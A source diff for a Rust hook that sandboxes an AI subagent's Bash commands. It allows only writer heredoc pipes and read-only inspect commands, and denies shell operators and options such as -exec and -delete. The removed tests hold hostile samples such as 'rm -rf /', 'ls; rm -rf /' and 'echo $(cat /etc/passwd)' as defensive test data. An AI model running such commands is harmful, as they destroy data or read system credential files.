@@ -1,820 +1,533 @@
-//! PreToolUse hook: validate subagent Bash commands.
+//! PreToolUse hook: the Bash sandbox of a subagent.
 //!
-//! Replaces validate_bash.py with new invocation patterns for nornir writers.
+//! A subagent may run exactly two kinds of command, both named on this hook's
+//! command line; every other command is denied.
 //!
 //! Usage (in agent frontmatter):
 //!     hook_pre_subagent_bash --writer tool1 tool2 --inspect cmd1=/path/ cmd2=/path/
 //!
-//! Categories:
-//!     --writer: nornir writer binaries. Validates heredoc-pipe pattern,
-//!              writer name in allowed list, optional name arg is bare filename.
-//!     --inspect: unix commands (ls, find, tree, etc.). First-word match,
-//!               all paths under allowed prefix, no shell chaining.
+//!   --writer   a nornir writer, fed one record on stdin in one of two forms:
+//!                  cat <<'RECORD' | writer [name]        (the record on the lines
+//!                  {...}                                  between, the delimiter
+//!                  RECORD                                 alone on the last line)
+//!                  echo '{...}' | writer [name]          (one line)
+//!   --inspect  a read-only command (ls, find, tree, ...) confined to one
+//!              directory: one line, no shell operators, every path it names
+//!              under that directory, and no option that runs a command or
+//!              writes or deletes a file.
+//!
+//! A command is allowed only when the whole of it is one of these forms.
 
-use std::collections::HashMap;
+use std::collections::BTreeMap;
 use std::process::ExitCode;
 use std::sync::LazyLock;
 
-use hook_io::{HookDecision, HookInput};
+use hook_decision_core::paths::{absolute_from, is_under, normalize};
+use hook_decision_core::{deny_because_undecided, HookDecision};
+use hook_io::{HookInput, WhenUndecided};
 use regex::Regex;
 
-static HEREDOC_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"^cat\s+<<'([A-Z_]+)'\s*\|\s*(\S+)(?:\s+(\S+))?\s*$").unwrap()
+const HOOK: &str = "hook_pre_subagent_bash";
+
+/// `cat <<'DELIM' | writer [name]` — the whole first line of the heredoc form.
+static HEREDOC_HEADER: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"^cat[ \t]+<<'([A-Z_]+)'[ \t]*\|[ \t]*([A-Za-z0-9_]+)(?:[ \t]+([A-Za-z0-9][A-Za-z0-9._-]*))?[ \t]*$")
+        .expect("the heredoc header pattern is a valid regex")
 });
 
-static ECHO_PIPE_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"^echo\s+'[^']*'\s*\|\s*(\S+)(?:\s+(\S+))?$").unwrap()
+/// `echo '...' | writer [name]` — the whole command of the echo form.
+static ECHO_PIPE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"^echo[ \t]+'[^'\n\r]*'[ \t]*\|[ \t]*([A-Za-z0-9_]+)(?:[ \t]+([A-Za-z0-9][A-Za-z0-9._-]*))?[ \t]*$")
+        .expect("the echo pipe pattern is a valid regex")
 });
 
-static PATH_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(/\S+)").unwrap()
-});
+/// Characters that give a command line structure beyond one command and its
+/// arguments. An inspect command holds none of them, quoted or not.
+const SHELL_OPERATORS: [char; 13] = [';', '|', '&', '<', '>', '(', ')', '$', '`', '{', '}', '\\', '\n'];
+
+/// Options that make a read-only command run a command, or write or delete.
+const ACTING_OPTIONS: [&str; 10] =
+    ["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls", "-o"];
 
 fn main() -> ExitCode {
-    hook_io::run_hook(decide)
+    hook_io::run_pre_hook(WhenUndecided::Deny, decide)
 }
 
-// ── Arg parsing ────────────────────────────────────────────────────
+// ── Config ─────────────────────────────────────────────────────────
 
+#[derive(Debug, Default)]
 struct Config {
     writers: Vec<String>,
-    inspect: HashMap<String, String>, // cmd_name → allowed_path_prefix
+    /// Inspect command → the directory it is confined to, normalised.
+    inspect: BTreeMap<String, String>,
 }
 
-fn parse_args() -> Config {
-    let args: Vec<String> = std::env::args().skip(1).collect();
-    let mut writers = Vec::new();
-    let mut inspect = HashMap::new();
-    let mut current: Option<&str> = None;
-
-    for arg in &args {
-        match arg.as_str() {
-            "--writer" => { current = Some("writer"); continue; }
-            "--inspect" => { current = Some("inspect"); continue; }
-            _ => {}
-        }
-        match current {
-            Some("writer") => writers.push(arg.clone()),
-            Some("inspect") => {
-                if let Some((name, path)) = arg.split_once('=') {
-                    inspect.insert(name.to_string(), path.to_string());
-                }
+/// The command line, read strictly: every argument belongs to a section, and
+/// every inspect entry is `command=/directory`.
+fn read_config(args: &[String]) -> Result<Config, String> {
+    let mut config = Config::default();
+    let mut section: Option<&str> = None;
+    for arg in args {
+        match (arg.as_str(), section) {
+            ("--writer", _) => section = Some("writer"),
+            ("--inspect", _) => section = Some("inspect"),
+            (name, Some("writer")) => config.writers.push(name.to_string()),
+            (entry, Some("inspect")) => {
+                let (command, directory) = inspect_entry(entry)?;
+                config.inspect.insert(command, directory);
             }
-            _ => {}
+            (other, _) => return Err(format!("{other} comes before --writer or --inspect")),
         }
     }
-
-    Config { writers, inspect }
+    Ok(config)
 }
 
-// ── Shell safety ───────────────────────────────────────────────────
-
-/// Characters that indicate shell chaining.
-fn has_chain_chars(command: &str) -> bool {
-    // Check for ;  |  &  `  $() outside of normal pipe usage
-    // We explicitly allow a single | for the heredoc-pipe pattern
-    command.contains(';')
-        || command.contains('`')
-        || command.contains("&&")
-        || command.contains("||")
-        || command.contains("$(")
-}
-
-/// Validate that a name arg is a bare filename (no path parts).
-/// Delegates to path_core::validate_path_segment (shared across workspace).
-fn is_bare_name(name: &str) -> bool {
-    path_core::validate_path_segment(name).is_ok()
-}
-
-// ── Writer validation ──────────────────────────────────────────────
-
-/// Parse the header line of a heredoc-pipe command.
-/// Returns (delimiter, writer_name, optional_name_arg) or None.
-fn parse_heredoc_header(first_line: &str) -> Option<(String, String, Option<String>)> {
-    // Match: cat <<'DELIM' | writer_name [name_arg]
-    let caps = HEREDOC_RE.captures(first_line)?;
-    Some((
-        caps.get(1)?.as_str().to_string(),
-        caps.get(2)?.as_str().to_string(),
-        caps.get(3).map(|cap| cap.as_str().to_string()),
-    ))
-}
-
-fn validate_writer(command: &str, writers: &[String]) -> HookDecision {
-    // Try heredoc pattern: first line is header, last line is delimiter
-    let lines: Vec<&str> = command.lines().collect();
-    if lines.len() >= 3 {
-        if let Some((delim, writer_name, name_arg)) = parse_heredoc_header(lines[0]) {
-            // Verify command ends with the delimiter on its own line
-            if lines.last().map(|l| l.trim()) != Some(delim.as_str()) {
-                return deny_bad_writer_pattern();
-            }
-            return check_writer_and_name(&writer_name, name_arg.as_deref(), writers);
+fn inspect_entry(entry: &str) -> Result<(String, String), String> {
+    match entry.split_once('=') {
+        Some((command, directory)) if !command.is_empty() && directory.starts_with('/') => {
+            Ok((command.to_string(), normalize(directory)))
         }
-    }
-
-    // Also allow: echo '...' | writer_name [name_arg]
-    if let Some(caps) = ECHO_PIPE_RE.captures(command) {
-        if let Some(writer_match) = caps.get(1) {
-            let name_arg = caps.get(2).map(|cap| cap.as_str());
-            return check_writer_and_name(writer_match.as_str(), name_arg, writers);
-        }
-    }
-
-    deny_bad_writer_pattern()
-}
-
-fn check_writer_and_name(
-    writer_name: &str,
-    name_arg: Option<&str>,
-    writers: &[String],
-) -> HookDecision {
-    if !writers.iter().any(|w| w == writer_name) {
-        return HookDecision::Deny {
-            category: "bash".into(),
-            event: format!("'{}' not in allowed writers", writer_name),
-            reason: format!(
-                "'{}' is not an allowed writer.\nAllowed writers:\n{}",
-                writer_name,
-                writers.iter().map(|w| format!("  {}", w)).collect::<Vec<_>>().join("\n")
-            ),
-        };
-    }
-    if let Some(name) = name_arg {
-        if !is_bare_name(name) {
-            return HookDecision::Deny {
-                category: "bash".into(),
-                event: format!("invalid name arg '{}'", name),
-                reason: format!(
-                    "Name argument '{}' must be a plain filename stem (e.g., 'entry-123').\n\
-                     No path separators, no leading dots, no leading dashes.",
-                    name
-                ),
-            };
-        }
-    }
-    HookDecision::Allow
-}
-
-fn deny_bad_writer_pattern() -> HookDecision {
-    HookDecision::Deny {
-        category: "bash".into(),
-        event: "unrecognized writer invocation pattern".into(),
-        reason: "Writer commands must use heredoc pipe pattern:\n  \
-                 cat <<'RECORD' | writer_name [name]\n  \
-                 {...json...}\n  \
-                 RECORD".into(),
-    }
-}
-
-// ── Inspect validation ─────────────────────────────────────────────
-
-fn validate_inspect(command: &str, _cmd_name: &str, allowed_path: &str) -> HookDecision {
-    if has_chain_chars(command) {
-        return warn_chaining(command);
-    }
-
-    // Extract all absolute paths from the command
-    for m in PATH_RE.find_iter(command) {
-        let path = m.as_str();
-        // Reject path traversal before prefix check — ".." can escape any prefix
-        if path.contains("..") {
-            return HookDecision::Deny {
-                category: "path".into(),
-                event: format!("blocked path traversal attempt in '{}'", path),
-                reason: format!(
-                    "'{}' contains path traversal (..) which is not allowed.\n\
-                     Use absolute paths without '..' components.",
-                    path
-                ),
-            };
-        }
-        if !path.starts_with(allowed_path) {
-            return HookDecision::Deny {
-                category: "bash".into(),
-                event: format!("path '{}' outside allowed prefix", path),
-                reason: format!(
-                    "Path '{}' is not under '{}'.",
-                    path, allowed_path
-                ),
-            };
-        }
-    }
-
-    HookDecision::Allow
-}
-
-// ── Shell chaining warning ─────────────────────────────────────────
-
-/// Shell chaining in a sandboxed subagent is an early adversarial signal.
-/// Deny the command AND produce a loud banner so the user knows.
-fn warn_chaining(command: &str) -> HookDecision {
-    let first_word = command.split_whitespace().next().unwrap_or("?");
-    HookDecision::Deny {
-        category: "chaining".into(),
-        event: format!(
-            "shell chaining detected in '{}' command — possible sandbox escape",
-            first_word
-        ),
-        reason: format!(
-            "Shell chaining characters (;  &&  ||  `) detected.\n\
-             This subagent is sandboxed. Each command must be a single operation.\n\
-             Chaining attempts are logged and flagged to the user."
-        ),
+        _ => Err(format!("{entry} is not command=/directory")),
     }
 }
 
 // ── Decision logic ─────────────────────────────────────────────────
 
 fn decide(input: &HookInput) -> HookDecision {
-    let config = parse_args();
+    let args: Vec<String> = std::env::args().skip(1).collect();
+    match read_config(&args) {
+        Ok(config) => decide_inner(input, &config),
+        Err(cause) => deny_because_undecided(HOOK, &cause),
+    }
+}
 
+fn decide_inner(input: &HookInput, config: &Config) -> HookDecision {
     let command = input.command();
-
-    if command.trim().is_empty() {
-        return HookDecision::Deny {
-            category: "bash".into(),
-            event: "empty command".into(),
-            reason: "Empty command.".into(),
-        };
-    }
-
-    let first_word = command.split_whitespace().next().unwrap_or("");
-
-    // Check if it's a writer invocation (starts with cat or echo piped to a writer)
-    if (first_word == "cat" || first_word == "echo") && command.contains('|') {
-        // Extract the pipe target to see if it's a known writer
-        let pipe_target = command
-            .splitn(2, '|')
-            .nth(1)
-            .map(|s| s.trim().split_whitespace().next().unwrap_or(""))
-            .unwrap_or("");
-
-        if config.writers.iter().any(|w| w == pipe_target) {
-            // Check for chaining outside the heredoc body
-            let outside = strip_heredoc_body(command);
-            if has_chain_chars(&outside) {
-                return warn_chaining(command);
-            }
-            return validate_writer(command, &config.writers);
-        }
-    }
-
-    // Check if it's a known inspect command
-    if let Some(allowed_path) = config.inspect.get(first_word) {
-        return validate_inspect(command, first_word, allowed_path);
-    }
-
-    // Not allowed — build help text
-    let mut allowed_list = Vec::new();
-    for w in &config.writers {
-        allowed_list.push(format!("  cat <<'RECORD' | {}\n  {{...json...}}\n  RECORD", w));
-    }
-    for (cmd, _) in &config.inspect {
-        allowed_list.push(format!("  {} <args>", cmd));
-    }
-    let help = if allowed_list.is_empty() {
-        "  (none)".to_string()
-    } else {
-        allowed_list.join("\n")
+    let Some(first_word) = command.split_whitespace().next() else {
+        return deny("bash", "empty command".into(), "Empty command.".into());
     };
 
-    HookDecision::Deny {
-        category: "bash".into(),
-        event: format!("'{}' is not allowed", first_word),
-        reason: format!(
-            "'{}' is not an allowed command.\nAllowed commands:\n{}\n\
-             All other Bash commands are blocked by the security boundary.",
-            first_word, help
+    if first_word == "cat" || first_word == "echo" {
+        return validate_writer(command, &config.writers);
+    }
+    match config.inspect.get(first_word) {
+        Some(directory) => validate_inspect(command, directory, input.cwd.as_deref().unwrap_or("/")),
+        None => deny_not_allowed(first_word, config),
+    }
+}
+
+fn deny(category: &str, event: String, reason: String) -> HookDecision {
+    HookDecision::Deny { category: category.into(), event, reason }
+}
+
+fn deny_not_allowed(first_word: &str, config: &Config) -> HookDecision {
+    let allowed: Vec<String> = config
+        .writers
+        .iter()
+        .map(|writer| format!("  cat <<'RECORD' | {writer}\n  {{...json...}}\n  RECORD"))
+        .chain(config.inspect.keys().map(|command| format!("  {command} <args>")))
+        .collect();
+    let help = if allowed.is_empty() { "  (none)".to_string() } else { allowed.join("\n") };
+    deny(
+        "bash",
+        format!("'{first_word}' is not allowed"),
+        format!(
+            "'{first_word}' is not an allowed command.\nAllowed commands:\n{help}\n\
+             All other Bash commands are blocked by the security boundary."
+        ),
+    )
+}
+
+// ── Writer validation ──────────────────────────────────────────────
+
+/// The writer and optional name of a command that is, whole, one of the two
+/// writer forms.
+fn writer_invocation(command: &str) -> Option<(String, Option<String>)> {
+    let lines: Vec<&str> = command.split('\n').collect();
+    let header = match lines.as_slice() {
+        [only] => ECHO_PIPE.captures(only)?,
+        [first, body @ .., last] => {
+            let header = HEREDOC_HEADER.captures(first)?;
+            let delimiter = header.get(1)?.as_str();
+            // The heredoc ends at the first line that is the delimiter. That
+            // line must be the last: anything after it would run as commands.
+            if *last != delimiter || body.iter().any(|line| *line == delimiter) {
+                return None;
+            }
+            // In the heredoc form the delimiter is group 1; shift to the echo
+            // form's numbering by reading the writer and name from 2 and 3.
+            return Some((header.get(2)?.as_str().to_string(), header.get(3).map(|name| name.as_str().to_string())));
+        }
+        [] => return None,
+    };
+    Some((header.get(1)?.as_str().to_string(), header.get(2).map(|name| name.as_str().to_string())))
+}
+
+fn validate_writer(command: &str, writers: &[String]) -> HookDecision {
+    match writer_invocation(command) {
+        Some((writer, name)) => check_writer_and_name(&writer, name.as_deref(), writers),
+        None => deny(
+            "bash",
+            "unrecognized writer invocation pattern".into(),
+            "Writer commands must be exactly one of:\n  \
+             cat <<'RECORD' | writer_name [name]\n  \
+             {...json...}\n  \
+             RECORD\n\
+             or, on one line:\n  \
+             echo '{...json...}' | writer_name [name]\n\
+             The delimiter appears only on the last line, and nothing follows it."
+                .into(),
         ),
     }
 }
 
-/// Strip heredoc body from command, returning only the header line.
-fn strip_heredoc_body(command: &str) -> String {
-    // For chaining detection, we only need the first line (the pipe header)
-    // and the delimiter line. The heredoc body is safe to ignore.
-    command.lines().next().unwrap_or(command).to_string()
+fn check_writer_and_name(writer: &str, name: Option<&str>, writers: &[String]) -> HookDecision {
+    if !writers.iter().any(|allowed| allowed == writer) {
+        let listed: Vec<String> = writers.iter().map(|allowed| format!("  {allowed}")).collect();
+        return deny(
+            "bash",
+            format!("'{writer}' not in allowed writers"),
+            format!("'{writer}' is not an allowed writer.\nAllowed writers:\n{}", listed.join("\n")),
+        );
+    }
+    match name {
+        Some(name) if path_core::validate_path_segment(name).is_err() => deny(
+            "bash",
+            format!("invalid name arg '{name}'"),
+            format!(
+                "Name argument '{name}' must be a plain filename stem (e.g., 'entry-123').\n\
+                 No path separators, no leading dots, no leading dashes."
+            ),
+        ),
+        _ => HookDecision::Allow,
+    }
+}
+
+// ── Inspect validation ─────────────────────────────────────────────
+
+fn validate_inspect(command: &str, directory: &str, working_directory: &str) -> HookDecision {
+    if let Some(operator) = command.chars().find(|character| SHELL_OPERATORS.contains(character) || *character == '\r') {
+        return deny_operator(command, operator);
+    }
+
+    let words: Vec<&str> = command.split_whitespace().skip(1).map(unquoted).collect();
+    if let Some(option) = words.iter().find(|word| ACTING_OPTIONS.contains(word)) {
+        return deny(
+            "bash",
+            format!("option '{option}' is not read-only"),
+            format!("'{option}' runs a command, or writes or deletes files. This command may only read."),
+        );
+    }
+
+    if let Some(under_home) = words.iter().find(|word| word.starts_with('~')) {
+        return deny(
+            "path",
+            format!("path '{under_home}' is under a home directory"),
+            format!("'{under_home}' starts with ~, which the shell expands to a home directory. Name absolute paths under '{directory}'."),
+        );
+    }
+
+    let reached = reached_paths(&words, working_directory);
+    match reached.iter().find(|path| !is_under(path, directory)) {
+        Some(outside) => deny(
+            "path",
+            format!("path '{outside}' outside allowed directory"),
+            format!("'{outside}' is not under '{directory}'. Name only paths under that directory, as absolute paths."),
+        ),
+        None => HookDecision::Allow,
+    }
+}
+
+fn unquoted(word: &str) -> &str {
+    word.trim_matches(|character| character == '\'' || character == '"')
+}
+
+/// Every path the words reach, absolute and normalised.
+///
+/// A word after an option is that option's value unless it looks like a path
+/// (it holds a `/`, or is `.` or `..`); every other word that is not
+/// an option is a path. A command that names no path reaches its working
+/// directory.
+fn reached_paths(words: &[&str], working_directory: &str) -> Vec<String> {
+    let mut reached = Vec::new();
+    let mut after_option = false;
+    for word in words {
+        let is_option = word.starts_with('-');
+        if !is_option && (!after_option || looks_like_a_path(word)) {
+            reached.push(absolute_from(working_directory, word));
+        }
+        after_option = is_option;
+    }
+    if reached.is_empty() {
+        reached.push(normalize(working_directory));
+    }
+    reached
+}
+
+fn looks_like_a_path(word: &str) -> bool {
+    word.contains('/') || word == "." || word == ".."
+}
+
+/// A shell operator in a sandboxed subagent's command is an early adversarial
+/// signal: denied, and loud.
+fn deny_operator(command: &str, operator: char) -> HookDecision {
+    let first_word = command.split_whitespace().next().unwrap_or("?");
+    deny(
+        "chaining",
+        format!("shell operator {operator:?} in '{first_word}' command — possible sandbox escape"),
+        "A shell operator ( ; | & < > ( ) $ ` { } \\ or a line break) was found.\n\
+         This subagent is sandboxed. Each command must be a single operation.\n\
+         Attempts are logged and flagged to the user."
+            .into(),
+    )
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
 
-    // ── has_chain_chars ───────────────────────────────────────────
-
-    #[test]
-    fn has_chain_chars_semicolon() {
-        assert!(has_chain_chars("ls; rm -rf /"));
+    fn config() -> Config {
+        let args: Vec<String> =
+            ["--writer", "append_record", "write_entry", "--inspect", "ls=/data/in/", "find=/data/in/", "tree=/data/in"]
+                .iter()
+                .map(|arg| arg.to_string())
+                .collect();
+        read_config(&args).unwrap()
     }
 
-    #[test]
-    fn has_chain_chars_and_and() {
-        assert!(has_chain_chars("cmd && cmd2"));
-    }
-
-    #[test]
-    fn has_chain_chars_or_or() {
-        assert!(has_chain_chars("cmd || cmd2"));
-    }
-
-    #[test]
-    fn has_chain_chars_backtick() {
-        assert!(has_chain_chars("echo `date`"));
-    }
-
-    #[test]
-    fn has_chain_chars_simple_path_false() {
-        assert!(!has_chain_chars("ls -la /path"));
-    }
-
-    #[test]
-    fn has_chain_chars_command_substitution() {
-        assert!(has_chain_chars("echo $(cat /etc/passwd)"));
-    }
-
-    #[test]
-    fn has_chain_chars_nested_subshell() {
-        assert!(has_chain_chars("ls $(whoami)"));
-    }
-
-    #[test]
-    fn has_chain_chars_single_pipe_allowed() {
-        // Single pipe is NOT a chaining character in this implementation
-        assert!(!has_chain_chars("cat <<'EOF' | writer"));
-    }
-
-    #[test]
-    fn has_chain_chars_empty_string() {
-        assert!(!has_chain_chars(""));
-    }
-
-    #[test]
-    fn has_chain_chars_normal_command() {
-        assert!(!has_chain_chars("cargo build --release"));
-    }
-
-    #[test]
-    fn has_chain_chars_single_ampersand_not_detected() {
-        // Single & (background) is NOT in the check — only && is
-        assert!(!has_chain_chars("sleep 5 &"));
-    }
-
-    // ── is_bare_name ──────────────────────────────────────────────
-
-    #[test]
-    fn is_bare_name_valid_stem() {
-        assert!(is_bare_name("entry-123"));
-    }
-
-    #[test]
-    fn is_bare_name_with_underscore() {
-        assert!(is_bare_name("my_file"));
-    }
-
-    #[test]
-    fn is_bare_name_alphanumeric() {
-        assert!(is_bare_name("report2024"));
-    }
-
-    #[test]
-    fn is_bare_name_path_separator_rejected() {
-        assert!(!is_bare_name("foo/bar"));
-    }
-
-    #[test]
-    fn is_bare_name_hidden_file_rejected() {
-        assert!(!is_bare_name(".hidden"));
-    }
-
-    #[test]
-    fn is_bare_name_flag_rejected() {
-        assert!(!is_bare_name("-flag"));
-    }
-
-    #[test]
-    fn is_bare_name_empty_rejected() {
-        assert!(!is_bare_name(""));
-    }
-
-    #[test]
-    fn is_bare_name_backslash_rejected() {
-        assert!(!is_bare_name("foo\\bar"));
-    }
-
-    #[test]
-    fn is_bare_name_dotdot_rejected() {
-        assert!(!is_bare_name("foo..bar"));
-    }
-
-    #[test]
-    fn is_bare_name_null_byte_rejected() {
-        assert!(!is_bare_name("foo\0bar"));
-    }
-
-    // ── parse_heredoc_header ──────────────────────────────────────
-
-    #[test]
-    fn parse_heredoc_header_basic() {
-        let result = parse_heredoc_header("cat <<'RECORD' | append_truth_qc_report_record");
-        assert!(result.is_some());
-        let (delim, writer, name_arg) = result.unwrap();
-        assert_eq!(delim, "RECORD");
-        assert_eq!(writer, "append_truth_qc_report_record");
-        assert!(name_arg.is_none());
-    }
-
-    #[test]
-    fn parse_heredoc_header_with_name_arg() {
-        let result = parse_heredoc_header("cat <<'EOF' | writer_name arg1");
-        assert!(result.is_some());
-        let (delim, writer, name_arg) = result.unwrap();
-        assert_eq!(delim, "EOF");
-        assert_eq!(writer, "writer_name");
-        assert_eq!(name_arg, Some("arg1".to_string()));
-    }
-
-    #[test]
-    fn parse_heredoc_header_not_heredoc() {
-        let result = parse_heredoc_header("echo hello");
-        assert!(result.is_none());
-    }
-
-    #[test]
-    fn parse_heredoc_header_unquoted_delimiter_rejected() {
-        // No quotes around delimiter — must be rejected
-        let result = parse_heredoc_header("cat <<RECORD | writer");
-        assert!(result.is_none());
-    }
-
-    #[test]
-    fn parse_heredoc_header_double_quoted_rejected() {
-        // Double quotes — must be rejected (only single quotes allowed)
-        let result = parse_heredoc_header("cat <<\"RECORD\" | writer");
-        assert!(result.is_none());
-    }
-
-    #[test]
-    fn parse_heredoc_header_no_pipe() {
-        let result = parse_heredoc_header("cat <<'RECORD'");
-        assert!(result.is_none());
-    }
-
-    #[test]
-    fn parse_heredoc_header_lowercase_delimiter_rejected() {
-        // Delimiter regex requires [A-Z_]+ — lowercase rejected
-        let result = parse_heredoc_header("cat <<'record' | writer");
-        assert!(result.is_none());
-    }
-
-    // ── validate_writer ───────────────────────────────────────────
-
-    #[test]
-    fn validate_writer_valid_heredoc() {
-        let cmd = "cat <<'RECORD' | my_writer\n{\"key\":\"value\"}\nRECORD";
-        let writers = vec!["my_writer".to_string()];
-        let decision = validate_writer(cmd, &writers);
-        match decision {
-            HookDecision::Allow => {} // correct
-            _ => panic!("Valid heredoc with allowed writer must Allow"),
-        }
-    }
-
-    #[test]
-    fn validate_writer_unknown_writer_denied() {
-        let cmd = "cat <<'RECORD' | evil_writer\n{\"key\":\"value\"}\nRECORD";
-        let writers = vec!["my_writer".to_string()];
-        let decision = validate_writer(cmd, &writers);
-        match decision {
-            HookDecision::Deny { category, reason, .. } => {
-                assert_eq!(category, "bash");
-                assert!(reason.contains("evil_writer"));
-                assert!(reason.contains("not an allowed writer"));
-            }
-            _ => panic!("Unknown writer must Deny"),
-        }
-    }
-
-    #[test]
-    fn validate_writer_bad_name_arg_denied() {
-        let cmd = "cat <<'RECORD' | my_writer ../escape\n{\"key\":\"value\"}\nRECORD";
-        let writers = vec!["my_writer".to_string()];
-        let decision = validate_writer(cmd, &writers);
-        match decision {
-            HookDecision::Deny { reason, .. } => {
-                assert!(
-                    reason.contains("plain filename stem"),
-                    "Bad name arg must explain the requirement"
-                );
-            }
-            _ => panic!("Path traversal in name arg must Deny"),
-        }
-    }
-
-    #[test]
-    fn validate_writer_not_heredoc_pattern() {
-        let cmd = "rm -rf /";
-        let writers = vec!["my_writer".to_string()];
-        let decision = validate_writer(cmd, &writers);
-        match decision {
-            HookDecision::Deny { reason, .. } => {
-                assert!(reason.contains("heredoc pipe pattern"));
-            }
-            _ => panic!("Non-heredoc pattern must Deny"),
-        }
-    }
-
-    #[test]
-    fn validate_writer_echo_pipe_valid() {
-        let cmd = "echo 'hello' | my_writer";
-        let writers = vec!["my_writer".to_string()];
-        let decision = validate_writer(cmd, &writers);
-        match decision {
-            HookDecision::Allow => {} // correct
-            _ => panic!("Valid echo pipe with allowed writer must Allow"),
-        }
-    }
-
-    #[test]
-    fn validate_writer_echo_pipe_unknown_writer() {
-        let cmd = "echo 'hello' | bad_writer";
-        let writers = vec!["my_writer".to_string()];
-        let decision = validate_writer(cmd, &writers);
-        match decision {
-            HookDecision::Deny { .. } => {} // correct
-            _ => panic!("Echo pipe with unknown writer must Deny"),
-        }
-    }
-
-    #[test]
-    fn validate_writer_heredoc_wrong_closing_delimiter() {
-        let cmd = "cat <<'RECORD' | my_writer\n{\"key\":\"value\"}\nWRONG";
-        let writers = vec!["my_writer".to_string()];
-        let decision = validate_writer(cmd, &writers);
-        match decision {
-            HookDecision::Deny { .. } => {} // correct — mismatched delimiter
-            _ => panic!("Mismatched delimiter must Deny"),
-        }
-    }
-
-    #[test]
-    fn validate_writer_heredoc_with_valid_name_arg() {
-        let cmd = "cat <<'RECORD' | my_writer entry-42\n{\"key\":\"value\"}\nRECORD";
-        let writers = vec!["my_writer".to_string()];
-        let decision = validate_writer(cmd, &writers);
-        match decision {
-            HookDecision::Allow => {} // correct
-            _ => panic!("Valid heredoc with bare name arg must Allow"),
-        }
-    }
-
-    #[test]
-    fn validate_writer_name_arg_leading_dot_denied() {
-        let cmd = "cat <<'RECORD' | my_writer .secret\n{\"key\":\"value\"}\nRECORD";
-        let writers = vec!["my_writer".to_string()];
-        let decision = validate_writer(cmd, &writers);
-        match decision {
-            HookDecision::Deny { .. } => {} // correct
-            _ => panic!("Name arg with leading dot must Deny"),
-        }
-    }
-
-    #[test]
-    fn validate_writer_name_arg_leading_dash_denied() {
-        let cmd = "cat <<'RECORD' | my_writer -flag\n{\"key\":\"value\"}\nRECORD";
-        let writers = vec!["my_writer".to_string()];
-        let decision = validate_writer(cmd, &writers);
-        match decision {
-            HookDecision::Deny { .. } => {} // correct
-            _ => panic!("Name arg with leading dash must Deny"),
-        }
-    }
-
-    // ── validate_inspect ──────────────────────────────────────────
-
-    #[test]
-    fn validate_inspect_path_under_prefix_allows() {
-        let decision = validate_inspect("ls /allowed/path/file.txt", "ls", "/allowed/path/");
-        match decision {
-            HookDecision::Allow => {} // correct
-            _ => panic!("Path under allowed prefix must Allow"),
-        }
-    }
-
-    #[test]
-    fn validate_inspect_path_outside_prefix_denied() {
-        let decision = validate_inspect("ls /etc/passwd", "ls", "/allowed/path/");
-        match decision {
-            HookDecision::Deny { category, reason, .. } => {
-                assert_eq!(category, "bash");
-                assert!(reason.contains("/etc/passwd"));
-                assert!(reason.contains("/allowed/path/"));
-            }
-            _ => panic!("Path outside prefix must Deny"),
-        }
-    }
-
-    #[test]
-    fn validate_inspect_with_chaining_denied() {
-        let decision = validate_inspect("ls /allowed/path/ && rm -rf /", "ls", "/allowed/path/");
-        match decision {
-            HookDecision::Deny { category, .. } => {
-                assert_eq!(category, "chaining");
-            }
-            _ => panic!("Chaining must Deny"),
-        }
-    }
-
-    #[test]
-    fn validate_inspect_path_traversal_denied() {
-        let decision = validate_inspect(
-            "ls /allowed/path/../../etc/passwd",
-            "ls",
-            "/allowed/path/",
-        );
-        match decision {
-            HookDecision::Deny { category, reason, .. } => {
-                assert_eq!(category, "path");
-                assert!(reason.contains("path traversal"));
-            }
-            _ => panic!("Path traversal with .. must be denied"),
-        }
-    }
-
-    #[test]
-    fn validate_inspect_path_traversal_mid_path_denied() {
-        let decision = validate_inspect(
-            "find /allowed/foo/../../../etc/shadow",
-            "find",
-            "/allowed/",
-        );
-        match decision {
-            HookDecision::Deny { category, .. } => {
-                assert_eq!(category, "path");
-            }
-            _ => panic!("Path traversal with .. must be denied"),
-        }
-    }
-
-    #[test]
-    fn validate_inspect_command_substitution_denied() {
-        let decision = validate_inspect(
-            "ls $(cat /etc/passwd)",
-            "ls",
-            "/allowed/",
-        );
-        match decision {
-            HookDecision::Deny { category, .. } => {
-                assert_eq!(category, "chaining");
-            }
-            _ => panic!("Command substitution must be denied"),
-        }
-    }
-
-    #[test]
-    fn validate_inspect_no_paths_at_all_allows() {
-        // Command with no path-like arguments at all
-        let decision = validate_inspect("ls", "ls", "/allowed/");
-        match decision {
-            HookDecision::Allow => {} // correct — no paths to check
-            _ => panic!("No paths at all means nothing to block"),
-        }
-    }
-
-    #[test]
-    fn validate_inspect_relative_path_with_slash_caught() {
-        // The regex (/\S+) catches "/path" inside "relative/path"
-        // This is intentional — slashes in arguments are suspicious
-        let decision = validate_inspect("ls relative/path", "ls", "/allowed/");
-        match decision {
-            HookDecision::Deny { .. } => {} // correct — /path is extracted and denied
-            _ => panic!("Embedded slash caught by path regex"),
-        }
-    }
-
-    #[test]
-    fn validate_inspect_multiple_paths_all_valid() {
-        let decision = validate_inspect(
-            "find /allowed/a /allowed/b -name '*.rs'",
-            "find",
-            "/allowed/",
-        );
-        match decision {
-            HookDecision::Allow => {} // correct
-            _ => panic!("Multiple paths all under prefix must Allow"),
-        }
-    }
-
-    #[test]
-    fn validate_inspect_one_bad_path_among_many() {
-        let decision = validate_inspect(
-            "find /allowed/a /etc/shadow -name '*.rs'",
-            "find",
-            "/allowed/",
-        );
-        match decision {
-            HookDecision::Deny { .. } => {} // correct
-            _ => panic!("One bad path must Deny the whole command"),
-        }
-    }
-
-    // ── strip_heredoc_body ────────────────────────────────────────
-
-    #[test]
-    fn strip_heredoc_body_multiline() {
-        let cmd = "cat <<'RECORD' | writer\n{\"key\":\"value\"}\nRECORD";
-        let result = strip_heredoc_body(cmd);
-        assert_eq!(result, "cat <<'RECORD' | writer");
-    }
-
-    #[test]
-    fn strip_heredoc_body_single_line() {
-        let cmd = "echo hello";
-        let result = strip_heredoc_body(cmd);
-        assert_eq!(result, "echo hello");
-    }
-
-    #[test]
